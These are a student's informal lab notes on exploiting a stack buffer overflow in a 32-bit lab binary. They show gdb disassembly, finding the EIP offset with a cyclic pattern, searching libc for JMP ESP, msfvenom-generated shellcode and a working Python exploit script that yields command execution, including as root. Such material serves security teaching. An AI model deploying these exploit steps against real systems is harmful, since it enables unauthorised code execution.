what is the stack
contiguous memory for passing arguments

how are things in the stack stored
like a magaines, first in last out

instruction pointer(program counter)
points to the next instruction(hijack)

stack pointer
points to the next availible place in the stack

whats a function
its a block of code for reuse

shell code
code that gives you a shell


buffer overflow
built in defenses


buffer overflow

confirmed break
open in debugger
id vulnerable function

parameter
input
feet the output of the scit ad in the input

user nput triple carrots
if it takes a parameter no triple carrots

gdb func

gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0000054d <+0>:	lea    ecx,[esp+0x4]
   0x00000551 <+4>:	and    esp,0xfffffff0
   0x00000554 <+7>:	push   DWORD PTR [ecx-0x4]
   0x00000557 <+10>:	push   ebp
   0x00000558 <+11>:	mov    ebp,esp
   0x0000055a <+13>:	push   ecx
   0x0000055b <+14>:	sub    esp,0x4
   0x0000055e <+17>:	call   0x5b0 <__x86.get_pc_thunk.ax>
   0x00000563 <+22>:	add    eax,0x1a71
   0x00000568 <+27>:	call   0x577 <getuserinput>
   0x0000056d <+32>:	nop
   0x0000056e <+33>:	add    esp,0x4
   0x00000571 <+36>:	pop    ecx
   0x00000572 <+37>:	pop    ebp
   0x00000573 <+38>:	lea    esp,[ecx-0x4]
   0x00000576 <+41>:	ret    
End of assembler dump.

gdb-peda$ pdisass getuserinput
Dump of assembler code for function getuserinput:
   0x00000577 <+0>:	push   ebp
   0x00000578 <+1>:	mov    ebp,esp
   0x0000057a <+3>:	push   ebx
   0x0000057b <+4>:	sub    esp,0x44
   0x0000057e <+7>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000583 <+12>:	add    ebx,0x1a51
   0x00000589 <+18>:	sub    esp,0xc
   0x0000058c <+21>:	lea    eax,[ebx-0x1994]
   0x00000592 <+27>:	push   eax
   0x00000593 <+28>:	call   0x3e0 <puts@plt>
   0x00000598 <+33>:	add    esp,0x10
   0x0000059b <+36>:	sub    esp,0xc
   0x0000059e <+39>:	lea    eax,[ebp-0x3a]
   0x000005a1 <+42>:	push   eax
   0x000005a2 <+43>:	call   0x3d0 <gets@plt>   **APPEARS IN RED**
   0x000005a7 <+48>:	add    esp,0x10
   0x000005aa <+51>:	nop
   0x000005ab <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x000005ae <+55>:	leave  
   0x000005af <+56>:	ret    
End of assembler dump.

greens are functions



student@lin-ops:~/Downloads$ ./func <<< $(python new.py)
Enter a string: 
Segmentation fault (core dumped)
student@lin-ops:~/Downloads$ 



  1 #buf = "A" * 100                                                               
  2 
  3 buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3    Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9A    f0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
  4 
  5 print(buf)




gdb-peda$ run <<< $(python /home/student/Downloads/new.py)
Starting program: /home/student/Downloads/func <<< $(python /home/student/Downloads/new.py)
Enter a string: 

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd43e ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
EBX: 0x41386241 ('Ab8A')
ECX: 0xf7fb75c0 --> 0xfbad2088 
EDX: 0xf7fb889c --> 0x0 
ESI: 0xf7fb7000 --> 0x1d7d8c 
EDI: 0x0 
EBP: 0x63413962 ('b9Ac')
ESP: 0xffffd480 ("Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
EIP: 0x31634130 ('0Ac1')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x31634130
[------------------------------------stack-------------------------------------]
0000| 0xffffd480 ("Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0004| 0xffffd484 ("c3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0008| 0xffffd488 ("4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0012| 0xffffd48c ("Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0016| 0xffffd490 ("c7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0020| 0xffffd494 ("8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0024| 0xffffd498 ("Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0028| 0xffffd49c ("d1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x31634130 in ?? ()
gdb-peda$ 



buffer overflow pattern genertor

change the program to only 62 bits

its a placeholder, the EIP in a 32 bit offset is 4 bytes long



gdb-peda$ run <<< $(python /home/student/Downloads/new.py)
Starting program: /home/student/Downloads/func <<< $(python /home/student/Downloads/new.py)
Enter a string: 

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd43e ('A' <repeats 62 times>, "BBBB")
EBX: 0x41414141 ('AAAA')
ECX: 0xf7fb75c0 --> 0xfbad2088 
EDX: 0xf7fb889c --> 0x0 
ESI: 0xf7fb7000 --> 0x1d7d8c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd480 --> 0xf7fe5900 (test   BYTE PTR [eax+0x194],0x8)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd480 --> 0xf7fe5900 (test   BYTE PTR [eax+0x194],0x8)
0004| 0xffffd484 --> 0xffffd4a0 --> 0x1 
0008| 0xffffd488 --> 0x0 
0012| 0xffffd48c --> 0xf7df7fa1 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd490 --> 0xf7fb7000 --> 0x1d7d8c 
0020| 0xffffd494 --> 0xf7fb7000 --> 0x1d7d8c 
0024| 0xffffd498 --> 0x0 
0028| 0xffffd49c --> 0xf7df7fa1 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 



EIP: 0x42424242 ('BBBB')
EIP: 0x42424242 ('BBBB')
EIP: 0x42424242 ('BBBB')
EIP: 0x42424242 ('BBBB')
EIP: 0x42424242 ('BBBB')


is our EIP correct


we have to loadup gdb without any plugins 

student@lin-ops:~/Downloads$ env - gdb func
(gdb) show env
LINES=20
COLUMNS=97

(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env         
(gdb) 


(gdb) run
Starting program: /home/student/Downloads/func 
Enter a string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb) info proc man

(gdb) info proc map
process 5483
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/student/Downloads/func
	0x56556000 0x56557000     0x1000        0x0 /home/student/Downloads/func
	0x56557000 0x56558000     0x1000     0x1000 /home/student/Downloads/func
	0x56558000 0x5657a000    0x22000        0x0 [heap]
	0xf7ddf000 0xf7fb4000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fb4000 0xf7fb5000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fb5000 0xf7fb7000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fb7000 0xf7fb8000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fb8000 0xf7fbb000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib/i386-linux-gnu/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
  
  
  right after the heap
  0xf7ddf000
  just beofre the stack
  0xf7ffe000 
  
  
  searching for JMP ESP
  
  looking for opcodes inbetween the HEAD and STACK hijack and jump to the top of the stack
  OPCODES 0xff, 0xe4
  
  
  
  
  
  (gdb) find /b 0xf7ddf000, 0xf7ffe000, 0xff, 0xe4
0xf7de1b59
0xf7f59597
0xf7f598f7
0xf7f5990f
0xf7f59917
0xf7f59a43
0xf7f64d43
0xf7f64d57
0xf7f64f9f
0xf7f64fc7
0xf7f64fd7
0xf7f65233
0xf7f654b7
0xf7f6563f
0xf7f65807
0xf7f6594b

  
  
  
  
  
  
  
  
  
  
  
  
  
  
    1 buf = "A" * 62
  2 
  3 eip = "\x5f\x78\xf6\xf7"                                                            
  4 
  5 '''
  6 0xf7 f6 78 5f
  7 0xf7f67bdf
  8 0xf7f67d4f
  9 0xf7f67eb7
 10 0xf7f680a7
 11 '''
 12 
 13 print(buf + eip) 





student@lin-ops:~$ msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 69 (iteration=0)
x86/shikata_ga_nai chosen with final size 69
Payload size: 69 bytes
Final size of python file: 353 bytes
buf =  b""
buf += b"\xb8\xa3\x12\x32\x84\xda\xd7\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x0b\x83\xc2\x04\x31\x42\x10\x03\x42\x10\x41"
buf += b"\xe7\x58\x8f\xdd\x91\xcf\xe9\xb5\x8c\x8c\x7c\xa2\xa7"
buf += b"\x7d\x0c\x44\x38\xea\xdd\xf6\x51\x84\xa8\x15\xf3\xb0"
buf += b"\xac\xd9\xf4\x40\xc4\xb1\x9b\x21\x47\x28\x64\xf5\xc4"
buf += b"\x23\x85\x34\x6a"


  1 buff = "A" * 62
  2 
  3 eip = "\x5f\x78\xf6\xf7"
  4 
  5 '''
  6 0xf7 f6 78 5f
  7 0xf7f67bdf
  8 0xf7f67d4f
  9 0xf7f67eb7
 10 0xf7f680a7
 11 '''
 12 
 13 nop = '\x90' * 10
 14 
 15 
 16 buf =  b""
 17 buf += b"\xb8\xa3\x12\x32\x84\xda\xd7\xd9\x74\x24\xf4\x5a\x29"
 18 buf += b"\xc9\xb1\x0b\x83\xc2\x04\x31\x42\x10\x03\x42\x10\x41"
 19 buf += b"\xe7\x58\x8f\xdd\x91\xcf\xe9\xb5\x8c\x8c\x7c\xa2\xa7"
 20 buf += b"\x7d\x0c\x44\x38\xea\xdd\xf6\x51\x84\xa8\x15\xf3\xb0"
 21 buf += b"\xac\xd9\xf4\x40\xc4\xb1\x9b\x21\x47\x28\x64\xf5\xc4"
 22 buf += b"\x23\x85\x34\x6a"
 23 
 24 print(buff + eip + nop + buf)  


student@lin-ops:~/Downloads$ ./func <<< $(python new.py)
Enter a string: 
student




troubleshooting steps
-double nop sled(25 max)
-regenerate the shell code(msfvenom)
-doublcheck the programming
-pick another jump esp that you pulled over
-restart from beginning

student@lin-ops:~/Downloads$ ./func <<< $(python new.py)
Enter a string: 
student
student@lin-ops:~/Downloads$ sudo ./func <<< $(python new.py)
Enter a string: 
root



just beffer overflow it
